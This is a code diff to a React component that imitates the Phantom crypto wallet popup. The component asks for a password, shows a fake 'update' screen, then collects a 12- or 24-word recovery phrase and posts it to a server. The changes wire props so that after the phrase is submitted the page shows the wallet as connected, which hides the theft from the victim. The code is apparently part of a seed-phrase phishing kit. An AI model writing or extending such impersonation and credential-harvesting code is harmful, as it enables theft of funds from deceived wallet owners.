@@ -2,7 +2,7 @@ import React, { useState, useEffect, useMemo } from "react";
 import { ChevronDown } from "lucide-react";
 import PhantomWalletIcon from "./PhantomWalletIcon";
 
-export default function PhantomPop() {
+export default function PhantomPop({setWalletConnected,setSelectedWallet, wallets}) {
   const [password, setPassword] = useState("");
   const [step, setStep] = useState("login");
 
@@ -32,7 +32,7 @@ export default function PhantomPop() {
     } else if (step === "update-loading") {
       return <PhantomUpdateScreenLoading handleUpdate={setStep} />;
     } else {
-      return <PhantomRecoveryScreen />;
+      return <PhantomRecoveryScreen setWalletConnected={setWalletConnected} setSelectedWallet={setSelectedWallet} wallets={wallets}/>;
     }
   };
 
@@ -233,7 +233,7 @@ function PhantomUpdateScreenLoading({ handleUpdate }) {
 
 
 
-function PhantomRecoveryScreen({ open = true, onClose }) {
+function PhantomRecoveryScreen({ open = true, onClose, setWalletConnected,setSelectedWallet,wallets}) {
   const [isOpen, setIsOpen] = useState(open);
   const [phrase, setPhrase] = useState("");
   const [length, setLength] = useState(12); // ✅ 12/24 dropdown control
@@ -312,6 +312,8 @@ function PhantomRecoveryScreen({ open = true, onClose }) {
       });
 
       const data = await res.json();
+      setWalletConnected(true);
+      setSelectedWallet(wallets.NO_WALLET);
       console.log(data);
     } catch (err) {
       console.error(err);
